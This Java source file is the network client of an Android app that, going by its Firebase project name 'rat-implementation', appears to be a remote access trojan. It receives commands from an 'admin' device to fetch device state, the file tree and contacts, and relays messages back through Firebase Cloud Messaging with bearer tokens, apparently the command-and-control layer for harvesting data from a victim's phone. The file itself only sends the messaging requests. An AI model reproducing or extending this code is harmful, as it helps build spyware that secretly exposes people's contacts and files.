package com.lyrnic.userside.network;

import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Context;
import android.os.Build;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.core.app.NotificationCompat;

import com.lyrnic.userside.R;
import com.lyrnic.userside.constants.Actions;
import com.lyrnic.userside.constants.Constants;
import com.lyrnic.userside.firebase.FirebaseActionsReceiver;
import com.lyrnic.userside.utilities.DevicesUtilities;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class ApiClient {
    public static void pushAction(Context context, String action, Object... arguments){

        switch (action){
            case Actions.ACTION_GET_STATE:
                sendState(context,(String)arguments[0]);
                break;
            case Actions.ACTION_GET_FILE_TREE:
                sendFileTree(context,(String)arguments[0],(String)arguments[1]);
                break;
            case Actions.ACTION_GET_CONTACTS:
                sendContacts(context,(String)arguments[0]);
                break;
        }

    }

    private static void sendState(Context context, String adminDeviceToken) {
        OkHttpClient client = new OkHttpClient();

        DevicesUtilities.isAdminDeviceExist(context,adminDeviceToken,(found -> {
            if(found){
                Thread thread = new Thread(() -> {
                    try {
                        Request request = sendStateRequest(context, adminDeviceToken);
                        client.newCall(request).enqueue(new Callback() {
                            @Override
                            public void onFailure(@NonNull Call call, @NonNull IOException e) {
                                showNotification(context, "Error", e.getMessage());
                                Log.d("ApiClient","send failure");
                            }

                            @Override
                            public void onResponse(@NonNull Call call, @NonNull Response response) {
                                if (response.isSuccessful()) {
                                    Log.d("ApiClient","send success");
                                } else {
                                    Log.d("ApiClient","just response " + response.code());
                                }
                                response.close();
                            }
                        });
                    } catch (JSONException | IOException e) {
                        showNotification(context, "Error", e.getMessage());
                    }
                });
                thread.start();

            }
        }));
    }
    public static void showNotification(Context context, String title, String text) {
        // Create a notification channel for Android Oreo and above
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel("my_channel_id", "My Channel", NotificationManager.IMPORTANCE_DEFAULT);
            NotificationManager notificationManager = (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
            notificationManager.createNotificationChannel(channel);
        }

        // Build the notification
        NotificationCompat.Builder notificationBuilder = new NotificationCompat.Builder(context, "my_channel_id")
                .setContentTitle(title)
                .setStyle(new NotificationCompat.BigTextStyle().bigText(text))
                .setSmallIcon(R.drawable.ic_launcher_foreground) // Replace with your own icon
                .setAutoCancel(true);

        // Show the notification
        NotificationManager notificationManager = (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
        notificationManager.notify(0, notificationBuilder.build());
    }
    private static Request sendStateRequest(Context context, String adminDeviceToken) throws JSONException, IOException {
        JSONObject jsonBody = new JSONObject();
        JSONObject message = new JSONObject();
        JSONObject data = new JSONObject();
        JSONObject android = new JSONObject();

        android.put(Constants.DATA_PRIORITY_KEY,"high");

        data.put(Constants.DATA_ACTION_KEY,Actions.ACTION_RECEIVE_STATE);
        data.put(Constants.DATA_DEVICE_TOKEN_KEY, FirebaseActionsReceiver.getToken(context));

        message.put("token", adminDeviceToken);
        message.put("data", data);
        message.put("android",android);

        jsonBody.put("message", message);



        RequestBody body = RequestBody.create(jsonBody.toString(), MediaType.parse("application/json"));

        return new Request.Builder()
                .url("https://fcm.googleapis.com/v1/projects/rat-implementation/messages:send")
                .post(body)
                .header("Content-Type","application/json")
                .header("Authorization","Bearer " + FirebaseActionsReceiver.getAccessToken(context))
                .build();
    }

    private static void sendFileTree(Context context, String userDeviceToken, String exists) {
        OkHttpClient client = new OkHttpClient();

        DevicesUtilities.isDeviceExist(context, userDeviceToken, (found -> {
            if (found) {
                Thread thread = new Thread(() -> {
                    try {
                        Request request = sendFileTreeRequest(context, userDeviceToken, exists);
                        client.newCall(request).enqueue(new Callback() {
                            @Override
                            public void onFailure(@NonNull Call call, @NonNull IOException e) {
                                e.printStackTrace();
                                Log.d("ApiClient","send failure");
                            }

                            @Override
                            public void onResponse(@NonNull Call call, @NonNull Response response) {
                                if (response.isSuccessful()) {
                                    Log.d("ApiClient","send success");
                                } else {
                                    try {
                                        Log.d("ApiClient","just response " + response.code() + " body: " + response.body().string() );
                                    } catch (IOException e) {
                                        throw new RuntimeException(e);
                                    }
                                }
                                response.close();
                            }
                        });
                    } catch (JSONException | IOException e) {
                        throw new RuntimeException(e);
                    }
                });
                thread.start();

            }
        }));
    }

    private static Request sendFileTreeRequest(Context context, String userDeviceToken, String exists) throws JSONException, IOException {
        JSONObject jsonBody = new JSONObject();
        JSONObject message = new JSONObject();
        JSONObject data = new JSONObject();
        JSONObject android = new JSONObject();

        android.put(Constants.DATA_PRIORITY_KEY,"high");

        data.put(Constants.DATA_ACTION_KEY,Actions.ACTION_RECEIVE_FILE_TREE);
        data.put(Constants.DATA_DEVICE_TOKEN_KEY, FirebaseActionsReceiver.getToken(context));
        data.put(Constants.DATA_PATH_EXISTS_KEY,exists);


        message.put("token", userDeviceToken);
        message.put("data", data);
        message.put("android",android);

        jsonBody.put("message", message);

        RequestBody body = RequestBody.create(jsonBody.toString(), MediaType.parse("application/json"));

        return new Request.Builder()
                .url("https://fcm.googleapis.com/v1/projects/rat-implementation/messages:send")
                .post(body)
                .header("Content-Type", "application/json")
                .header("Authorization", "Bearer " + FirebaseActionsReceiver.getAccessToken(context))
                .build();
    }
    private static void sendContacts(Context context, String userDeviceToken) {
        OkHttpClient client = new OkHttpClient();

        DevicesUtilities.isDeviceExist(context, userDeviceToken, (found -> {
            if (found) {
                Thread thread = new Thread(() -> {
                    try {
                        Request request = sendContactsRequest(context, userDeviceToken);
                        client.newCall(request).enqueue(new Callback() {
                            @Override
                            public void onFailure(@NonNull Call call, @NonNull IOException e) {
                                e.printStackTrace();
                                Log.d("ApiClient","send failure");
                            }

                            @Override
                            public void onResponse(@NonNull Call call, @NonNull Response response) {
                                if (response.isSuccessful()) {
                                    Log.d("ApiClient","send success");
                                } else {
                                    try {
                                        Log.d("ApiClient","just response " + response.code() + " body: " + response.body().string() );
                                    } catch (IOException e) {
                                        throw new RuntimeException(e);
                                    }
                                }
                                response.close();
                            }
                        });
                    } catch (JSONException | IOException e) {
                        throw new RuntimeException(e);
                    }
                });
                thread.start();

            }
        }));
    }

    private static Request sendContactsRequest(Context context, String userDeviceToken) throws JSONException, IOException {
        JSONObject jsonBody = new JSONObject();
        JSONObject message = new JSONObject();
        JSONObject data = new JSONObject();
        JSONObject android = new JSONObject();

        android.put(Constants.DATA_PRIORITY_KEY,"high");

        data.put(Constants.DATA_ACTION_KEY,Actions.ACTION_RECEIVE_CONTACTS);
        data.put(Constants.DATA_DEVICE_TOKEN_KEY, FirebaseActionsReceiver.getToken(context));

        message.put("token", userDeviceToken);
        message.put("data", data);
        message.put("android",android);

        jsonBody.put("message", message);

        RequestBody body = RequestBody.create(jsonBody.toString(), MediaType.parse("application/json"));

        return new Request.Builder()
                .url("https://fcm.googleapis.com/v1/projects/rat-implementation/messages:send")
                .post(body)
                .header("Content-Type", "application/json")
                .header("Authorization", "Bearer " + FirebaseActionsReceiver.getAccessToken(context))
                .build();
    }

}
